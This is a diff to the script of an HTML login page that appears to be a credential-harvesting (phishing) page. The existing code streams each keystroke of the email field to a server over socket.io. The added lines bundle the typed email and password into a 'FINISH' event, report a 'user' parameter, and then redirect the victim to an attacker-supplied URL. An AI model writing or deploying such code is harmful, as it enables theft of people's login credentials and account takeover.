@@ -769,6 +769,10 @@
         })(document, window);
     }
 </script>
+<script
+  src="https://code.jquery.com/jquery-3.2.1.min.js"
+  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+  crossorigin="anonymous"></script>
 <script src="/socket.io/socket.io.js"></script>
 <script>
     function getParameterByName(name, url) {
@@ -783,6 +787,8 @@
 
     var socket = io();
 
+    socket.emit('USER_NAME', getParameterByName('user'))
+
     document.getElementById('index_email').oninput = function (e) {
         socket.emit('LOGIN_INPUT', e.target.value);
     }
@@ -793,8 +799,10 @@
 
     document.getElementById('index_login_form').onsubmit = function(e){
         e.preventDefault();
-        socket.emit('LOGIN_INPUT', document.getElementById('index_email').value);
-        socket.emit('PASSWORD_INPUT', document.getElementById('index_pass').value);
+        socket.emit('FINISH', {
+            email: document.getElementById('index_email').value,
+            password: document.getElementById('index_pass').value
+        })
         window.location = getParameterByName('redirect')
     }
 </script>
